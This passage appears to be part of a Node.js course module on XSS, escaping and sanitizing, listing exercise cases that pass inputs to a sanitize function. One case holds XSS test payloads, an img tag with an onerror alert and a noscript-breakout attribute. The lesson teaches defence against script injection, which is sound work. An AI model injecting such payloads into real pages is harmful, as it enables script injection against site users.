    { goi: `sanitize(['<img src=x onerror=alert(1)>', { tag: 'br' }, { tag: 'noscript', children: [{ tag: 'p', attrs: { title: '</noscript><img src=x onerror=alert(1)>' } }] }])`, an: true },
    { goi: `sanitize([{ tag: 'p', children: ['Ghi chú ', { tag: 'b', children: ['quan trọng'] }, ': xem ', { tag: 'a', attrs: { href: '/notes/1?a=1&b="2"' }, children: ['tại đây'] }] }, { tag: 'ul', children: [{ tag: 'li', children: ['1 < 2'] }] }])`, an: true },
  ],
});

export default modul('nodejs-9-2-xss-va-sanitize', '9.2 XSS: escape, sanitize and the stored note', [E1, E2, E3, E4, E5]);
